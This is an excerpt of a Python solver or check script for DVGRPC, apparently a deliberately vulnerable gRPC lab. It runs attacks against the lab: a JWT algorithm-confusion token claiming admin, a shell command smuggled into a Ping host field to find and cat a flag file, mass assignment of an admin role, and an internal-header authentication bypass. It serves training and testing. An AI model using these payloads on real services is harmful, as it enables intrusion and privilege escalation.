...
def check_jwt_confusion(channel):
    ...
    tok = jwt.encode({"user_id": 1, "username": "admin", "role": "admin"}, pub, algorithm="HS256")
    users = user_pb2_grpc.UserServiceStub(channel)
    r = users.GetProfile(
        user_pb2.GetProfileRequest(user_id=1), metadata=(("authorization", f"Bearer {tok}"),)
    )
...
def check_command_injection(channel):
    ...
    # Search the likely DVGRPC_ROOT locations (Docker /app, local ./.dvgrpc,
    # GH Actions workspaces, pytest tmp) — keeps the probe fast in CI.
    payload = (
        "127.0.0.1; "
        "find /app /tmp /home /github /workspace . -maxdepth 6 -name cmd_flag.txt "
        "-exec cat {} \\; 2>/dev/null"
    )
    r = cmd.Ping(
        command_pb2.PingRequest(host=payload, count=1), metadata=(("authorization", f"Bearer {tok}"),)
    )
...
def check_mass_assignment(channel):
    ...
    auth.Register(auth_pb2.RegisterRequest(username=u, password="pw", email="e@e", role="admin"))
...
def check_metadata_bypass(channel):
    ...
    users = user_pb2_grpc.UserServiceStub(channel)
    r = users.ListUsers(user_pb2.ListUsersRequest(), metadata=(("x-internal-service", "dvgrpc-internal-v1"),))
...
def check_int_overflow(channel):
    ...
    return (
        all_rows.total_returned > n_normal and "FLAG{" in joined,
...
def main() -> int:
    ...
    pass_count = 0
    # In --json mode we stay silent so stdout is a clean JSON document.
    if not args.json:
    ...
    if args.update_scoreboard:
        path = Path(os.getenv("DVGRPC_PROGRESS_FILE", str(Path.home() / ".dvgrpc-progress.json")))
    ...
    if args.json:
        # Clean JSON on stdout so callers can parse it without noise.
